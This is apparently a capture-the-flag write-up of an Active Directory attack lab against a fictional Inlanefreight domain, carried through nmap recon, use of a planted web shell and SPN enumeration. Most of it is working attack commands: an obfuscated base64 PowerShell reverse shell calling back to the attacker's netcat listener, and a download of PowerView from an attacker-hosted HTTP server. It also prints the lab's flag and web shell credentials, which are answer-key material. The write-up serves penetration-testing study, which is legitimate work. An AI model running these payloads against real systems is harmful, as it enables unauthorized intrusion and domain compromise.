## AD Enumeration & Attacks - Skills Assessment Part I

**Scenario**
A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: admin:My_W3bsH3ll_P@ssw0rd!) in place for us to start from in the /uploads directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.

Apply what you learned in this module to compromise the domain and answer the questions below to complete part I of the skills assessment.

1-  **Submit the contents of the flag.txt file on the administrator Desktop of the web server**

I started by performing an Nmap scan on the target to identify open ports and running services:

```c
nmap -sC -sV 10.129.63.234
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-26 09:46 CDT
Nmap scan report for 10.129.63.234
Host is up (0.030s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-26T14:46:54
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.51 seconds
```
I then navigated to the Antak webshell hosted on the IIS server by opening Firefox and navigating to **http://10.129.63.234/uploads/antak.aspx**. Logged in with the credentials provided.

Before executing a reverse shell, I set up a Netcat listener on my Linux machine to catch the incoming connection:
```c
nc -lvnp 4444
```

From the Antak webshell, I executed the following PowerShell payload to establish a reverse shell:
```c

PS> powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAwADgAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```
To improve interactivity, I upgraded the shell using Python:

```c
python -c 'import pty; pty.spawn("cmd.exe")'
```
Once I had an upgraded shell, I navigated to the Administrator's Desktop directory:

```c

PS C:\USers\Administrator\Desktop> cat flag.txt
JusT_g3tt1ng_st@rt3d
```
2- **Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer**

I started by hosting a Python HTTP server on my attacking machine:

```c
python3 -m http.server 8000
```

On the Windows target, I used PowerShell to download the PowerView script:

```c
PS C:\Users\Administrator\Desktop> Invoke-WebRequest -Uri "http://10.10.14.108:8000/PowerView.ps1" -OutFile "C:\Users\Administrator\Desktop\PowerView.ps1"
```
Once transferred, I imported the module:

```c
PS C:\Users\Administrator\Desktop> Import-Module .\PowerView.ps1

```
With PowerView loaded, I enumerated all domain users with associated Service Principal Names (SPNs), which are potential targets for Kerberoasting:
```c
PS C:\Users\Administrator\Desktop> Get-DomainUser * -spn | select samaccountname, serviceprincipalname

samaccountname serviceprincipalname                       
-------------- --------------------                       
azureconnect   adfsconnect/azure01.inlanefreight.local    
backupjob      backupjob/veam001.inlanefreight.local      
krbtgt         kadmin/changepw                            
sqltest        MSSQLSvc/DEVTEST.inlanefreight.local:1433  
sqlqa          MSSQLSvc/QA001.inlanefreight.local:1433    
sqldev         MSSQLSvc/SQL-DEV01.inlanefreight.local:1433
svc_sql        MSSQLSvc/SQL01.inlanefreight.local:1433    
sqlprod        MSSQLSvc/SQL02.inlanefreight.local:1433    

```

